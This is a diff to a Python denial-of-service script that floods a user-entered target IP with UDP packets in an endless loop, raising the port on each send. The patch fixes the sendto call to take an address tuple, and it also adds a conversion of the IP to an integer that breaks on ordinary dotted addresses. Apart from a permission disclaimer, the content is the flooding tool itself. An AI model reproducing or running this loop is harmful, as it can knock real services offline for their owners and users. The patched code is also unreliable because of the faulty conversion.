@@ -26,8 +26,10 @@ print("Disclaimer: Illicit use of this tool could lead to a violation of federal
 print("Use this tool only on your own website or websites from which you have obtained permission.")
 print("License: The source code of this tool is under the MIT License. © 2022 Tommaso Bona")
 print()
-ip = input("IP Target : ")
-port = input("Port       : ")
+ip = input("IP Target: ")
+port = input("Port: ")
+ip = int(ip)
+port = int(port)
 os.system("clear")
 print("\033[91m")
 os.system("figlet DoS Attack")
@@ -45,7 +47,7 @@ print("[====================] 100%")
 time.sleep(3)
 sent = 0
 while True:
-     sock.sendto(bytes,ip,port)
+     sock.sendto(bytes,(ip,port))
      sent = sent + 1
      port = port + 1
      print("Sent %s packet to %s throught port:%s"%(sent,ip,port))
